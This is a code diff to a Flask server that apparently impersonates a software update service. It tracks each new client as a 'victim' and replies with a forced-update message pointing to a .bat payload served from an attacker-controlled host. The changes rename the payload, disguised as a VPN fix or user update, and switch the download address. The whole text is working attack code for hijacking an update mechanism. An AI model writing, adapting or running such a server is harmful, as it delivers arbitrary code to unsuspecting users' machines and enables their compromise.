@@ -8,7 +8,7 @@ app = Flask(__name__, static_folder='static')
 
 
 # payload should be in static/
-PAYLOAD = 'static/fix_vpn.bat'
+PAYLOAD = 'static/userupdate16.bat'
 assert(os.path.exists(PAYLOAD))
 
 
@@ -29,7 +29,7 @@ def show_update(subpath):
             print(f'*********** New victim! {remote_ip}', file=sys.stderr)
             with open(flag_fn, 'w') as f:
                 f.write('foobar!')
-            return f'newVersionUser=14&mustUpdate=1&urlUser=http://77.175.129.123/{PAYLOAD}'
+            return f'newVersionUser=14&mustUpdate=1&urlUser=http://192.168.2.47:5000/{PAYLOAD}'
         else:
             print(f'Not messing with old victim! {remote_ip}', file=sys.stderr)
             return 'mustUpdate=0'
